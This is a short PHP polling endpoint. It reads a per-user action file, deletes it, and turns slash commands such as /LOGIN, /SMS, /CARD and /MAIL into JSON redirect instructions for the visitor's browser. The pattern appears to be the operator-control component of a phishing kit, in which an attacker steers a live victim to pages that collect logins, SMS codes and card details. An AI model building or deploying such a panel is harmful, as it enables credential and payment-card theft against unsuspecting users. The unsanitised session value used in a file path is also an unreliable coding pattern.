<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;

if (!$usuario) {
    echo json_encode(['action' => null]);
    exit;
}

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);
    
    // Mapear acciones a respuestas esperadas
    switch ($accion) {
        case "/LISTO":
            echo json_encode(['action' => 'redirect_listo']);
            break;
        case "/COMPRA":
            echo json_encode(['action' => 'redirect_compra']);
            break;
        case "/LOGIN":
            echo json_encode(['action' => 'redirect_login']);
            break;
        case "/SMS":
            echo json_encode(['action' => 'redirect_sms']);
            break;
        case "/CARD":
            echo json_encode(['action' => 'redirect_card']);
            break;
        case "/MAIL":
            echo json_encode(['action' => 'redirect_mail']);
            break;
        default:
            echo json_encode(['action' => null]);
            break;
    }
} else {
    echo json_encode(['action' => null]);
}
?>
